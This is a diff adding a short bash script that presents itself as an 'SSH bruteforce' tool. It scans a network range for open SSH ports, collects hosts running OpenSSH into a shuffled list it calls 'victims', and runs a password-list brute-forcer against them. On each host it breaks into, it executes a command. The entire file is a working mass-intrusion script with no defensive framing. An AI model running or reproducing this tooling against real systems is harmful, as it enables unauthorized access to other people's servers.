@@ -1,0 +1,18 @@
+#!/bin/bash
+# ./x class threads port
+clear
+rm -rf banner.log ips.lst bios.txt
+echo "[+][+][+][+][+][+][+][+][+][+][+]"
+echo "[+]    Bruteforce SSH #N3S    [+]"
+echo "[+][+][+][+][+][+][+][+][+][+][+]"
+./psc $3 -a $1 -i eth0 -s 10 > /dev/null
+pkill -f psc
+./ban bios.txt $3 350 > /dev/null
+pkill -f ban
+cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> ips.lst
+victims=`grep -c . ips.lst`
+echo "[+] Filtred Ip's > $victims [+]"
+./brute $2 -f ips.lst pass.lst $3 "cat /proc/version"
+pkill brute
+
+
